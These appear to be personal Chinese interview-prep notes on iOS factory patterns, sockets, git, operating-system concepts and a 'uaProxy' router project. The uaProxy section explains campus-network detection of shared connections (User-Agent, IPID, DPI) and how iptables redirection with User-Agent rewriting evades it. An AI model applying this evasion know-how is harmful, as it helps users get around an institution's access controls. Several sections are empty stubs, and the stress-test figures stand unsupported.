    // 这就是工厂方法，由子类去实现
    - (BaseView *)createView; 
    @end
    ```

2.  **创建具体工厂子类**
    ```objc
    // ImageViewFactory.h
    @interface ImageViewFactory : BaseViewFactory
    @end
    
    // ImageViewFactory.m
    @implementation ImageViewFactory
    - (BaseView *)createView {
        return [[ImageView alloc] init]; // 只负责创建 ImageView
    }
    @end
    
    // TextViewFactory.h
    @interface TextViewFactory : BaseViewFactory
    @end
    
    // TextViewFactory.m
    @implementation TextViewFactory
    - (BaseView *)createView {
        return [[TextView alloc] init]; // 只负责创建 TextView
    }
    @end
    ```

3.  **客户端使用**
    ```objc
    // Client code
    BaseViewFactory *factory = nil;
    if (/* a condition */) {
        factory = [[ImageViewFactory alloc] init];
    } else {
        factory = [[TextViewFactory alloc] init];
    }
    
    BaseView *myView = [factory createView];
    [self.view addSubview:myView];
    ```

**优点**: **完全符合开闭原则**。当需要增加一个新产品 `VideoView` 时，我们只需要创建一个新的 `VideoViewFactory` 子类，而**完全不需要修改任何已有的工厂代码**。
**缺点**: 每增加一个产品，就需要增加一个对应的工厂类，导致类的数量成倍增加，系统结构更复杂。

---

### **四、抽象工厂模式 (Abstract Factory Pattern)**

这是最复杂、也是最强大的工厂模式。它用来处理**“产品族”**的创建。

*   **结构**: 提供一个接口，用于创建**一系列相关或相互依赖的对象**，而无需指定它们具体的类。
*   **比喻**: 你要去装修房子，有“中式风格”和“现代风格”两种选择。
    *   **抽象工厂**: `ThemeFactory` 协议，它定义了必须能生产 `createButton`, `createLabel`, `createWindow` 这些组件。
    *   **具体工厂1**: `ChineseThemeFactory` 类。它生产出来的按钮、标签、窗户都是**中式风格**的。
    *   **具体工厂2**: `ModernThemeFactory` 类。它生产出来的按钮、标签、窗户都是**现代风格**的。
    *   客户端只需要选择一个“风格工厂”，然后通过这个工厂创建出来的所有组件，就自动保证了风格的统一。

**代码示例（概念）：**
```objc
// 抽象工厂协议
@protocol ThemeFactoryProtocol <NSObject>
- (UIButton *)createButton;
- (UILabel *)createLabel;
@end

// 具体工厂
@interface DarkThemeFactory : NSObject <ThemeFactoryProtocol>
- (UIButton *)createButton { /* 返回一个黑色背景的按钮 */ }
- (UILabel *)createLabel { /* 返回一个白色字体的标签 */ }
@end

@interface LightThemeFactory : NSObject <ThemeFactoryProtocol>
- (UIButton *)createButton { /* 返回一个白色背景的按钮 */ }
- (UILabel *)createLabel { /* 返回一个黑色字体的标签 */ }
@end

// 客户端使用
id<ThemeFactoryProtocol> factory = [[DarkThemeFactory alloc] init]; // 选择一个主题
UIButton *myButton = [factory createButton];
UILabel *myLabel = [factory createLabel];
```

**优点**:
*   **保证产品族的兼容性**: 确保了由同一个工厂创建出来的所有产品，在风格或功能上是相互匹配的。
*   **隔离了具体实现**: 切换整个产品族变得非常容易，只需要更换具体工厂的实例即可。
**缺点**:
*   **最复杂**。
*   **扩展新产品困难**: 如果你想在 `ThemeFactory` 中增加一个 `createTextField` 的方法，那么所有的具体工厂子类都必须进行修改，这违反了开闭原则

## tcp通信用了哪些socket函数

`socket()`: 创建通信套接字。

`connect()`: 连接到服务器。

`send()`/`recv()`: 与服务器进行数据通信。

`close()`: 关闭通信套接字。

## ***charles抓包的原理是什么，charles有什么用？

# git

com.baidu.jjjjdn

新建本地分支第一件事就是这个 ，相当于给远程创建一个分支

git push --set-upstream origin dev/11.0.5/media/feed00-66115 

git fetch origin 

git reset --hard origin/master

# uaproxy

## 校园网的检测方式

* 检测ip地址：检测一个账号下有几个ip地址，但是路由器有nat模式，完全可以连多个设备转成一个源ip，没有用。
* 检测user-agent：检测一个源ip地址的http请求的user-agent字段是不是一样的
* ipid
=======
## 校园网是怎么检测到多个useragent就能给我的设备下线呢 怎么做到的

### 检测与下线的技术流程
假设你的校园网账号是 student001 ，你用这个账号在认证页面登录成功了。此时，系统后台就建立了一个“会话（Session）”，这个会话包含了关键信息：

- 账号 ： student001
- 分配的IP地址 ：比如 10.1.2.3
- 登录时间 ： 2023-10-27 10:00:00
- MAC地址 ：你登录时用的那台设备的MAC地址 AA:BB:CC:11:22:33
现在，你和你室友的设备都通过你的路由器上网，对外都是同一个IP 10.1.2.3 。你们的网络流量都会经过校园网的核心交换机或网关设备，这些设备上部署了**深度包检测（DPI, Deep Packet Inspection）**功能。

DPI设备就像一个能力超强的“网络交警”，它不只看IP地址和端口号（普通NAT路由做的事），它能深入到数据包的“内部”，去读取应用层的数据。具体到我们的场景，它的工作流程是这样的：

第一步：流量嗅探与关联

DPI设备会实时监控所有流经它的网络数据包。当它抓到一个来自IP地址 10.1.2.3 的数据包时，它会把这个包和后台的会话关联起来，它知道“哦，这是 student001 这个账号的流量”。

第二步：HTTP请求解析

如果这个数据包是一个HTTP请求（目标端口是80），DPI设备就会解析这个HTTP报文的头部，找到 User-Agent 字段。

- 你用电脑浏览器访问网站，DPI抓到了一个包，看到 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... 。
- 你室友用iPhone刷抖音，DPI抓到了另一个包，看到 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) ... 。
第三步：特征记录与比对

计费系统的后台会为每个会话（也就是每个登录的账号）维护一个“设备指纹列表”。

1. 当 student001 这个账号第一次产生HTTP流量时，系统记录下它的 User-Agent ：“Windows NT 10.0”。并把这个指纹和账号关联，同时设备计数器置为1。
2. 几秒钟后，系统又抓到了一个来自同一个IP的HTTP包，但这次的 User-Agent 是“iPhone OS 16_0”。系统会检查 student001 的设备指纹列表，发现这是一个全新的指纹。
3. 系统立即将“iPhone OS 16_0”也加入到 student001 的指纹列表中，并且把设备计数器增加到2。
第四步：触发策略与执行动作

计费系统里预设了策略，比如“ 单一账号允许的并发设备数不得超过1台 ”。

当 student001 的设备计数器从1变成2的时候，就命中了这条策略。系统会立即触发一个动作，这个动作通常是：

- 发送强制下线指令 ：系统会向认证网关发送一个指令，要求断开IP地址 10.1.2.3 的网络连接。这在技术上可以通过多种方式实现，比如：
  - ARP欺骗 ：向你的设备发送伪造的ARP包，告诉它网关的MAC地址是一个无效地址，让你无法访问互联网。
  - TCP Reset ：直接向你和目标服务器发送TCP RST包，强行中断你们之间的所有TCP连接。
  - 防火墙封禁 ：在核心防火墙上添加一条规则，直接 DROP 掉所有源IP是 10.1.2.3 的数据包。
  结果就是 ：你的设备突然就断网了，需要重新去认证页面登录。而一旦你重新登录，旧的会话和设备指纹列表被清空，这个循环又会重新开始。

## 怎么处理的websocket


这个问题非常棒，直接切入了项目健壮性的一个关键点。能考虑到`WebSocket`这种特殊的HTTP场景，说明你对现代Web应用的技术栈有很好的理解。如果不处理`WebSocket`的协议升级，你的代理程序将会导致所有依赖`WebSocket`的应用**完全无法工作或表现异常**，这会是一个非常糟糕的用户体验。

我们来分析一下为什么会这样，以及具体会出现哪些问题。

### WebSocket协议升级过程回顾

首先，`WebSocket`连接并不是一开始就是`WebSocket`协议，它是一个“升级”的过程：

1.  **初始握手**：客户端（比如浏览器）会先发起一个标准的HTTP GET请求。但这个请求很特殊，它包含了几个关键的头部字段：
    *   `Connection: Upgrade`
    *   `Upgrade: websocket`
    *   以及其他如 `Sec-WebSocket-Key` 等字段。
2.  **服务器响应**：如果服务器支持`WebSocket`，它会返回一个HTTP 101 Switching Protocols` 的响应，表示“好的，我们同意切换协议”。
3.  **协议切换**：一旦这个HTTP响应完成，这条底层的TCP连接的“身份”就变了。它不再用于传输一问一答式的HTTP报文，而是变成了一个**全双工、持续的二进制/文本帧的传输通道**，也就是`WebSocket`协议。

### 如果你的代理不处理升级，会发生什么？

你的代理的核心逻辑在 `handleHTTPConnection` 函数里，它是一个 `for` 循环，不断地调用 `http.ReadRequest` 来读取和处理HTTP请求。

```go
// 伪代码，简化自你的项目
func handleHTTPConnection(reader, server) {
    for {
        req, err := http.ReadRequest(reader) // <--- 问题根源在这里
        if err != nil { return }

        // ... 修改 User-Agent ...

        req.Write(server)
    }
}
```

现在，我们来模拟一下`WebSocket`握手时会发生什么灾难性的后果：

1.  **第一次握手请求**：客户端发起`WebSocket`升级请求。你的代理程序在循环中第一次调用`http.ReadRequest`，成功读取了这个请求，修改了`User-Agent`，然后通过`req.Write(server)`把它发给了服务器。到这里一切正常。

2.  **服务器响应升级**：服务器返回了`HTTP 101 Switching Protocols`响应。这个响应通过`io.Copy`被正确地转发回了客户端。客户端和服务器双方都认为协议已经成功升级了。

3.  **灾难发生**：
    *   现在，这条TCP连接已经变成了`WebSocket`通道。客户端会开始通过这个通道向服务器发送`WebSocket`的**数据帧（Frame）**。这些数据帧是二进制格式的，**它们根本不是HTTP请求报文**。
    *   然而，你的代理程序的`for`循环并不知道协议已经变了！它会执行下一次循环，再次调用 `http.ReadRequest(reader)`，试图从这条连接上读取一个**标准的HTTP请求**。
    *   `http.ReadRequest`在读取`WebSocket`数据帧时，会发现这些数据的格式完全不符合HTTP协议的规范（比如，不是以`GET`、`POST`等方法开头）。它会立即解析失败，并返回一个错误，比如“invalid method”或类似的解析错误。
    *   因为`err != nil`，你的`handleHTTPConnection`函数会直接`return`，导致整个连接处理的goroutine退出，**TCP连接被关闭**。

### 用户会遇到的具体问题

因为`WebSocket`连接在握手成功后瞬间就被你的代理“掐死”了，用户会遇到以下各种问题：

*   **网页聊天室/在线客服无法连接**：很多网页版的聊天功能都使用`WebSocket`。用户会看到页面一直在转圈，或者提示“连接中...”，但永远也连不上。
*   **在线游戏卡死或掉线**：许多H5在线游戏使用`WebSocket`进行实时的数据同步。用户可能刚进入游戏界面就卡死，或者玩几秒钟就掉线。
*   **协同编辑工具（如在线文档）无法使用**：这些工具依赖`WebSocket`来同步多个用户的操作。用户会发现自己输入的内容无法保存，也看不到别人的修改。
*   **部分网站的动态内容加载失败**：一些现代网站也会用`WebSocket`来推送通知、更新信息流等。这些动态功能会全部失效。

### 正确的处理方式（也就是你项目中的实现）

你项目中的代码完美地规避了这个问题：

```go
// ...
if req.Header.Get("Upgrade") == "websocket" && req.Header.Get("Connection") == "Upgrade" {
    logrus.Debug("this is websocket request")
    break // <--- 关键！
}
// ...

handleNonHTTPConnection(bufioReader, serverConn) // <--- 后续处理
```

在每次处理完一个HTTP请求后，你都检查了它是不是一个`WebSocket`升级请求。如果是，就用`break`跳出`for`循环，不再尝试用`http.ReadRequest`去解析后续的流量。然后，程序会接着执行`handleNonHTTPConnection`，这个函数就是一个简单的`io.Copy`，它把这条已经“变身”为`WebSocket`的连接当作普通的TCP连接来处理，忠实地在客户端和服务器之间双向转发数据帧。这样就保证了`WebSocket`通信的正常进行。
        

## **Q2: 你提到使用 iptables 实现流量拦截，能详细说说这个过程吗？**

## **Q5: 如何实现"协议自动识别"？具体是通过什么特征来判断的？**


是的，您的理解基本正确，但有几个重要的前提和细节需要厘清。

对于一个**标准的、未加密的 HTTP/1.x 请求**，当TCP连接建立后，客户端发送的第一个数据包，其最开头的几个字节**必然是HTTP请求方法**。

### 为什么是这样？

这由HTTP/1.1协议规范（RFC 7230）定义。一个HTTP请求的起始行（Request Line）格式是固定的：

`Method SP Request-URI SP HTTP-Version CRLF`

*   **Method**: 请求方法，例如 `GET`, `POST`, `PUT`, `DELETE`, `HEAD`, `OPTIONS`, `CONNECT`, `TRACE`, `PATCH` 等。它必须是整个请求的第一个部分。
*   **SP**: 一个空格符。
*   **Request-URI**: 请求的资源标识符，例如 `/index.html`。
*   **HTTP-Version**: HTTP协议版本，例如 `HTTP/1.1`。
*   **CRLF**: 回车换行符（`\r\n`）。

所以，当 `uaProxy` 从一个TCP连接中读取数据时，如果它读到的前3个字节是 `G-E-T`，或者前4个字节是 `P-O-S-T`，它就有很高的把握判断这是一个HTTP请求。

### 重要的例外：HTTPS

这个规律**完全不适用于HTTPS**。

当一个TCP连接用于HTTPS时，它承载的数据首先是**TLS/SSL握手协议**，而不是HTTP协议。

1.  **TCP三次握手**完成后，连接建立。
2.  客户端会立即发送一个 **Client Hello** 消息，这是TLS握手的开始。这个消息的二进制格式是固定的，其第一个字节通常是 `0x16` (22)，代表这是一个握手消息（Handshake record）。
3.  服务器回应 **Server Hello** 等消息。
4.  握手完成后，双方建立起一个加密信道。
5.  之后，所有HTTP请求（包括 `GET /index.html ...`）都会被**加密**后，再在这个加密信道上传输。

因此，对于一个HTTPS连接，`uaProxy` 如果去读取前几个字节，它读到的会是 `0x16` 开头的TLS握手数据，而不是 `GET` 或 `POST` 这样的ASCII字符串。这也是为什么 `uaProxy` 这类代理需要有能力“嗅探”流量类型：

*   如果开头是 `GET`, `POST` 等可打印的HTTP方法 -> 这是HTTP流量，可以解析并修改 `User-Agent`。
*   如果开头不是这些方法（比如是 `0x16`） -> 这很可能是HTTPS或其他未知协议的流量，不能按HTTP解析，必须直接转发（`io.Copy`），否则会破坏TLS握手，导致连接失败。
        

## 你认为这个项目部署在路由器上 能承载多少人使用

### 1. 压测数据展示

**具体测试结果：**
```
测试环境：OpenWrt路由器，MT7621 880MHz单核，256MB内存

压测数据：
- 50个并发HTTP连接：CPU使用率65%，响应正常
- 80个并发HTTP连接：CPU使用率85%，开始出现延迟
- 100个并发HTTP连接：CPU使用率95%，部分连接超时

结论：该CPU配置下，安全并发数约为60-70个HTTP连接
```

### 2. 压测方法详述

**工具选择和命令：**
```bash
# 使用wrk进行HTTP压力测试
wrk -t4 -c50 -d60s --latency http://192.168.1.1/test

# 使用ab进行阶梯式测试
for i in {10,20,30,50,80,100}; do
    echo "Testing $i concurrent connections"
    ab -n 1000 -c $i http://192.168.1.1/ > result_$i.txt
done

# 监控系统资源
top -p $(pgrep uaProxy) -d 1
sar -u 1 60  # CPU使用率
ss -s | grep TCP  # 连接数统计
```

**测试场景设计：**
```
1. 纯HTTP流量测试（需要解析User-Agent）
2. 纯HTTPS流量测试（直接转发）
3. 混合流量测试（80% HTTPS + 20% HTTP）
4. 长连接vs短连接对比
5. 不同User-Agent长度的影响
```

### 3. 瓶颈分析深度

**CPU瓶颈具体分析：**
```go
// 通过pprof分析发现热点函数
go tool pprof http://localhost:6060/debug/pprof/profile

主要CPU消耗：
1. HTTP请求解析：35%
2. 正则表达式匹配：25% 
3. User-Agent字符串替换：20%
4. 网络I/O和goroutine调度：20%
```


### 










​        

## **Q10: 如果要支持 UDP 协议，你会如何设计？**

- 考察架构设计能力
- 是否理解不同协议的特点

## Q11: 项目的性能瓶颈可能在哪里？如何优化？

## **Q12: 这个项目在生产环境中如何部署？需要考虑哪些因素？**

## **Q13: 如何监控代理的运行状态？出现问题如何排查？*
## SO_ORIGINAL_DST 系统调用

一个tcp连接被 **iptables** 重定向之后，会在接字上设置一个特殊的选项 `SO_ORIGINAL_DST`

相当于暴露出一个特殊的套接字api，允许程序获取被 iptables 重定向前的原始目标地址和端口

## 什么是dial方法，什么是ipid检测，为什么可以解决这个反检测

### 1. 什么是 `Dial` 方法？

在 Go 语言中，`Dial`（或 `Dialer.Dial`）是网络编程的核心函数，它的作用就像是“打电话”。当一个程序想要和远程服务器建立一个网络连接（比如TCP连接）时，它就会调用 `Dial` 方法。

*   **功能**：向指定的网络地址（比如 `"tcp"` 协议的 `"www.baidu.com:80"`）发起连接请求。
*   **角色**：扮演网络连接中的“客户端”角色。
*   **结果**：如果连接成功，它会返回一个 `net.Conn` 类型的连接对象，程序后续就可以通过这个对象进行数据的读取和写入。如果失败，则返回一个错误。

在 `uaProxy` 项目中，当它截获一个用户的请求后，它自己就需要扮演客户端的角色去连接真正的目标服务器，这时它就会调用 `dialer.Dial()` 来建立这个新的连接。

---

### 2. 什么是 `IPID` 检测？

`IPID` 检测是一种比 `User-Agent` 检测更高级、更隐蔽的**识别共享上网（NAT）**的方法。它利用了IP协议头中的一个字段：**IP Identification (IPID)**。

*   **IPID 是什么**：IP 包在网络中传输时，如果包的大小超过了网络的 MTU（最大传输单元），就会被分片成多个小包。`IPID` 字段就是一个16位的标识符，同一个原始大包被分片后，所有小分片的 `IPID` 都是相同的，这样接收方才能把它们重新组装起来。

*   **检测原理**：
    1.  **操作系统的实现**：大多数操作系统（如 Windows、Linux）在发送IP包时，会为每个发出的包维护一个**全局或半全局的、单调递增的 `IPID` 计数器**。也就是说，一个系统发出的连续IP包，它们的 `IPID` 值通常是连续递增的（比如 100, 101, 102, 103...）。
    2.  **检测逻辑**：计费网关或防火墙会监控从同一个认证账号（同一个内网IP）发出的所有数据包。它会提取每个数据包的 `IPID` 值并观察其规律。
    3.  **发现异常**：
        *   **单台设备**：`IPID` 序列看起来非常“平滑”，是连续递增的，例如 `101, 102, 103, ...`。
        *   **多台设备共享上网**：假设路由器下有两台电脑 A 和 B。A 发出的包 `IPID` 序列是 `101, 102, ...`，B 发出的包 `IPID` 序列是 `5001, 5002, ...`。这些包经过路由器进行NAT转换后，源IP都变成了同一个（路由器的WAN口IP），但它们的 `IPID` 依然保留了各自操作系统生成的值。因此，计费网关看到的 `IPID` 序列就会是混乱的、跳跃的，比如 `101, 5001, 102, 5002, ...`。网关看到这种不连续的 `IPID` 序列，就能高度确信这个账号背后有多台设备在同时上网。

---

### 3. 为什么 `uaProxy` 能解决 `IPID` 反检测？

`uaProxy` 能够解决 `IPID` 检测，并不是因为它去修改了 `IPID`（它没有这么做），而是**它的工作模式天然地统一了 `IPID` 的来源**。

我们回顾一下 `uaProxy` 的工作流程：

1.  路由器下的所有设备（电脑A, B, C...）发出的网络请求，都被 `iptables` 拦截并交给了运行在路由器上的 `uaProxy` 程序。
2.  对于每一个被拦截的请求，`uaProxy` 并不是简单地转发数据包，而是**终止（Terminate）**了原始的TCP连接。
3.  然后，`uaProxy` **以自己（路由器操作系统）的身份**，调用 `Dial` 方法，**发起一个全新的TCP连接**到真正的目标服务器。

**关键点就在这里**：所有最终发往外网的数据包，**全都是由路由器上运行的 `uaProxy` 程序创建并由路由器操作系统发出的**。这意味着，无论后端连接了多少台设备，它们发出的所有IP包的 `IPID`，都是由**路由器这一个操作系统**的 `IPID` 计数器生成的。

因此，计费网关看到的 `IPID` 序列，永远都是来自路由器这单一来源的、平滑的、单调递增的序列。它看起来就和只有一台设备（路由器本身）在上网完全一样，从而完美地规避了 `IPID` 检测。

简单来说，`uaProxy` 充当了一个“中转站”和“代言人”，它把所有后端设备的请求都“消化”掉，然后用自己的名义重新发出，从而抹平了所有后端设备在网络特征（包括 `IPID`）上的差异。
        

## iptables是什么，如何设置的规则、

* `iptables` 是 **Linux 系统内核 Netfilter 框架的命令行管理工具**，它主要负责**配置防火墙规则**。

  ------

  它的核心功能包括：

  - **数据包过滤 (Packet Filtering)：** 允许或阻止特定网络数据包的进出。
  - **网络地址转换 (NAT)：** 修改数据包的源或目标 IP 地址/端口。比如，SNAT 让内网多台设备共用一个公网 IP 上网；DNAT 则能将外部请求重定向到内部服务器，这是实现**透明代理**的关键。
  - **数据包修改 (Mangle)：** 给数据包打标记或修改其内容，用于更高级的流量控制。

创建一个 `uaProxy` 链来包含你的代理规则。

在 `uaProxy` 链中，首先放行**发往内网**的流量。

然后放行**已标记为代理自身流量**的包，防止回环。

**所有剩余的 TCP 流量**都会被重定向到你本地的 `12345` 端口，即你的 Go 代理程序。

最后，在 `PREROUTING` 链（用于转发其他设备的流量）和 `OUTPUT` 链（用于本机发出的流量）中，都设置跳转到 `uaProxy` 链，从而实现**对所有 TCP 流量的透明代理**。

## 这些命令都什么意思

```java
iptables -t nat -N uaProxy # 新建一个名为 uaProxy 的链
iptables -t nat -A uaProxy -d 192.168.0.0/16 -j RETURN # 直连 192.168.0.0/16
iptables -t nat -A uaProxy -p tcp -j RETURN -m mark --mark 0xff
# 直连 SO_MARK 为 0xff 的流量(0xff 是 16 进制数，数值上等同与上面配置的 255)，此规则目的是避免代理本机(网关)流量出现回环问题
iptables -t nat -A uaProxy -p tcp -j REDIRECT --to-ports 12345 # 其余流量转发到 12345 端口（即 uaProxy默认开启的redir-port）
iptables -t nat -A PREROUTING -p tcp -j uaProxy # 对局域网其他设备进行透明代理
iptables -t nat -A OUTPUT -p tcp -j uaProxy # 对本机进行透明代理. 可以不加, 建议加, 加之后nmap等类似工具会失效
```

### 1. 创建新的规则链
```bash
iptables -t nat -N uaProxy
```
*   **-t nat**: 指定操作在 `nat` (Network Address Translation) 表上进行。`nat` 表主要负责网络地址转换，是实现透明代理的核心。
*   **-N uaProxy**: 创建一个名为 `uaProxy` 的新的用户自定义链（Chain）。把所有相关的规则都放在这个链里，方便管理和维护。

### 2. 忽略局域网流量
```bash
iptables -t nat -A uaProxy -d 192.168.0.0/16 -j RETURN
```
*   **-A uaProxy**: 将这条规则追加（Append）到 `uaProxy` 链中。
*   **-d 192.168.0.0/16**: 匹配所有目标地址（destination）是 `192.168.0.0` 到 `192.168.255.255` 网段的流量。这通常是您的局域网地址范围。
*   **-j RETURN**: 如果匹配成功，就执行 `RETURN` 动作，意味着“跳出当前链，返回到调用它的链继续处理”。简单来说，就是**局域网内部的设备间通信不经过代理**，直接放行。

### 3. 防止代理流量回环
```bash
iptables -t nat -A uaProxy -p tcp -j RETURN -m mark --mark 0xff
```
*   **-p tcp**: 匹配 TCP 协议的流量。
*   **-m mark --mark 0xff**: 匹配被打了标记（mark）为 `0xff`（十进制为 255）的流量。
*   **-j RETURN**: 同样是跳出当前链，直接放行。
*   **目的**: 这是为了防止已经由 `uaProxy` 处理过的流量再次被重定向回 `uaProxy`，从而造成死循环。`uaProxy` 程序在向外发送请求时，会给自己的数据包打上这个标记，`iptables` 看到这个标记后就知道这是“自己人”，直接放行。

### 4. 重定向流量到代理端口
```bash
iptables -t nat -A uaProxy -p tcp -j REDIRECT --to-ports 12345
```
*   **-j REDIRECT --to-ports 12345**: 这是核心规则。对于所有走到这一步的 TCP 流量（即非局域网、也未被标记的流量），执行 `REDIRECT` 动作，将它们的目标端口重定向到 `12345`。`uaProxy` 程序正是在这个端口上监听和接收流量的。

### 5. 应用规则到网络流量
```bash
iptables -t nat -A PREROUTING -p tcp -j uaProxy
iptables -t nat -A OUTPUT -p tcp -j uaProxy
```
*   **-A PREROUTING ... -j uaProxy**: 将 `PREROUTING` 链中的 TCP 流量引导到我们之前创建的 `uaProxy` 链进行处理。`PREROUTING` 链处理的是所有**进入**路由器（或本机）的数据包。这条规则是实现**对局域网内其他设备进行透明代理**的关键。
*   **-A OUTPUT ... -j uaProxy**: 将 `OUTPUT` 链中的 TCP 流量也引导到 `uaProxy` 链。`OUTPUT` 链处理的是由路由器（或本机）**自己产生**的数据包。这条规则是实现**对本机进行透明代理**的关键。

## 怎么防止回环流量的 

## 为什么readme说不能和clash一起运行 为什么


您好，`uaProxy` 和 `Clash`（或其他类似代理工具）不能同时运行的根本原因在于它们都会**争夺对系统网络流量的控制权**，这主要体现在 `iptables` 规则的冲突上。

想象一下，`iptables` 就像一个十字路口的交通警察，它根据一系列规则来指挥网络数据包“该往哪里走”。

1.  **`uaProxy` 的工作方式**：
    *   它设置 `iptables` 规则，告诉系统：“把所有发往外网的 TCP 流量都重定向到我的 `12345` 端口来。”（也就是 `REDIRECT` 规则）。
    *   它的核心功能是修改 HTTP 请求中的 `User-Agent`，然后把流量发往它本该去的原始目标地址。

2.  **`Clash` (等代理工具) 的工作方式**：
    *   它同样会设置 `iptables` 规则（通常在 `TPROXY` 或 `REDIRECT` 模式下），告诉系统：“把所有（或根据规则匹配的）流量都转发给我来处理。”
    *   它的核心功能是根据用户配置的规则（比如哪些网站走代理，哪些直连），将流量发往不同的代理服务器或直接连接。

### 冲突点在哪里？

当您同时运行两者时，它们都会去修改 `iptables` 的 `PREROUTING` 和 `OUTPUT` 链，试图让网络流量先经过自己。这就导致了以下问题：

*   **规则覆盖与混乱**：谁的 `iptables` 规则后应用，谁就可能“获胜”，覆盖掉对方的规则。这会导致其中一个工具完全失效，或者两个工具都工作不正常。
*   **流量处理循环**：最坏的情况下，可能会形成一个处理循环。比如，流量先被 `uaProxy` 捕获，处理后发出去；发出去的流量又被 `Clash` 的规则捕获，`Clash` 处理完可能又会把流量导回，再次被 `uaProxy` 捕获，形成死循环，最终导致网络请求超时、无法访问任何网站。
*   **不可预测的行为**：即使没有形成死循环，流量先经过谁、后经过谁，处理逻辑会变得非常混乱。例如，如果流量先经过 `uaProxy` 修改了 `User-Agent`，再交给 `Clash`，`Clash` 可能会根据这个被修改过的请求头做出了错误的判断。反之亦然。   

# 操作系统

## 死锁必要条件

死锁（Deadlock）的发生必须同时满足四个**必要条件**，缺一不可。它们是：

### 1. 互斥

一个资源每次只能被一个进程使用。如果一个进程已经占用了某个资源，其他进程就必须等待，直到该资源被释放。这是死锁的基础，因为如果资源可以被多个进程共享，就不会发生竞争。

### 2. 请求与保持

当一个进程因请求某个资源而阻塞时，它对自己已获得的资源仍保持着不放。也就是说，它“抱着”已有的资源不放，同时又“等着”新的资源。

### 3. 不可剥夺

进程已获得的资源，在未使用完之前，不能被任何其他进程强行夺走，只能由拥有它的进程自己显式地释放。

### 4. 循环等待

存在一个进程链，使得每个进程都在等待下一个进程所持有的资源。例如，进程 P1 等待 P2 的资源，P2 等待 P3 的资源，而 P3 又在等待 P1 的资源，形成一个环路。

如果这四个条件同时满足，系统就可能进入死锁状态。要避免或解决死锁，通常就是**破坏**其中的一个或多个条件。

## 线程和进程的区别？(628/1759=35.7%)

### 核心区别对比表

| 特性              | 进程 (Process)                                               | 线程 (Thread)                                                |
| :---------------- | :----------------------------------------------------------- | :----------------------------------------------------------- |
| **根本定义**      | **资源分配的基本单位**                                       | **CPU 调度和执行的基本单位**                                 |
| **资源占用**      | **拥有独立的内存地址空间**、文件句柄、设备等资源。           | **共享所在进程的全部资源**（内存、文件等），但有自己独立的栈、程序计数器。 |
| **开销/效率**     | **“重量级”**。创建、销毁、切换的开销大，速度慢。             | **“轻量级”**。创建、销毁、切换的开销小，速度快。             |
| **通信方式**      | 复杂。需要通过**进程间通信 (IPC)**，如管道、套接字、共享内存。 | 简单。可以直接读写共享的内存（全局变量、堆），但需要注意同步问题。 |
| **健壮性/隔离性** | **强**。一个进程的崩溃通常不会影响其他进程。                 | **弱**。一个线程的崩溃或错误（如内存访问越界）会导致整个进程崩溃。 |
| **关系**          | 一个进程至少包含**一个**线程（主线程）。                     | 线程必须存在于进程之中。                                     |

---

### 详细解读

#### 1. 根本定义：资源 vs 执行

*   **进程 (Process)**: 当你双击运行一个程序（如 Chrome.exe），操作系统就会创建一个进程。操作系统会为这个进程**分配一套独立的资源**，最重要的是独立的内存空间。它是一个“静态”的资源容器。
*   **线程 (Thread)**: 线程才是**真正干活**的单位。它是在进程的资源环境中运行的一条执行路径。CPU 在调度任务时，看到的是一个个的线程，而不是进程。

#### 2. 资源所有权：独立 vs 共享

*   **进程**：拥有独立的**堆 (Heap)** 和**栈 (Stack)**，以及独立的全局变量区域。进程 A 无法直接访问进程 B 的内存，这是由操作系统强制保证的，提供了极好的安全性。
*   **线程**：
    *   **共享**：同一进程内的所有线程共享该进程的**堆内存**、**全局变量**、**代码段**和**文件句柄**。这意味着一个线程可以很方便地访问另一个线程的数据。
    *   **独有**：为了保证独立运行，每个线程有自己**私有的栈**（用于存储函数调用和局部变量）、**程序计数器**（记录下一条要执行的指令地址）和**寄存器**。

#### 3. 开销与效率：重量级 vs 轻量级

*   **进程切换**：从进程 A 切换到进程 B，CPU 需要切换整个内存管理的上下文（页表等），并将缓存中的数据清空。这是一个非常耗时的操作。
*   **线程切换**：从同一进程的线程 A 切换到线程 B，因为它们共享内存空间，所以只需要切换线程私有的栈和寄存器等少量数据即可，**速度快得多**。

#### 4. 通信与同步：复杂 vs 简单（但危险）

*   **进程间通信 (IPC)**: 因为内存相互隔离，进程间的通信必须通过操作系统提供的特定机制，比较复杂且效率较低。
*   **线程间通信**: 因为共享内存，线程 A 可以直接修改一个全局变量，线程 B 马上就能看到。这种方式非常高效，但**带来了巨大的风险**——**数据竞争 (Race Condition)**。当多个线程同时修改同一个数据时，可能会导致数据错乱。因此，多线程编程必须使用**同步机制**（如互斥锁 Mutex、信号量 Semaphore）来确保数据安全。

## 什么是内存碎片

## 内存对齐解释下

## 虚拟内存是什么

## 进程调度算法有哪些？

### 1. 先来先服务 (First-Come, First-Served, FCFS)

这是最简单的一种调度算法。

*   **核心思想**：按照进程到达就绪队列的先后顺序进行调度。谁先来，谁就先被服务。
*   **生活中的例子**：在银行排队叫号，号码靠前的先办理业务。
*   **工作方式**：维护一个先进先出 (FIFO) 的队列。
*   **优点**：
    *   实现简单，容易理解。
    *   对所有进程都相对公平。
*   **缺点**：
    *   **效率低下**：平均等待时间可能很长。
    *   **护航效应 (Convoy Effect)**：如果一个耗时很长的进程先到达，它会一直占用 CPU，导致后面许多耗时很短的进程不得不长时间等待，就像一辆慢速卡车堵住了一整条高速公路。
*   **类型**：非抢占式 (Non-Preemptive)，即一个进程一旦获得 CPU，就会一直运行直到它完成或主动放弃（如等待 I/O）。

---

### 2. 最短作业优先 (Shortest Job First, SJF)

*   **核心思想**：优先选择**预计运行时间最短**的进程来执行。
*   **生活中的例子**：在超市结账时，你可能会选择排在只买了一两件商品的人后面，而不是排在购物车堆满的人后面。
*   **工作方式**：从就绪队列中找出预计运行时间最短的那个进程，并分配 CPU。
*   **优点**：
    *   **平均等待时间最短**：在所有算法中，SJF 被证明是能获得最低平均等待时间的。
*   **缺点**：
    *   **难以预测运行时间**：在实际系统中，很难精确地知道一个进程到底需要运行多久。通常只能靠历史数据进行估算。
    *   **对长作业不友好**：如果不断有新的短作业到来，长作业可能永远得不到执行，导致“饥饿”(Starvation) 现象。
*   **类型**：
    *   **非抢占式 SJF**：一旦开始，就必须运行到底。
    *   **抢占式 SJF** (也称为 **最短剩余时间优先, Shortest Remaining Time First, SRTF**)：如果一个新到达的进程比当前正在运行的进程的**剩余时间**还要短，则会中断当前进程，立即执行新来的短进程。

---

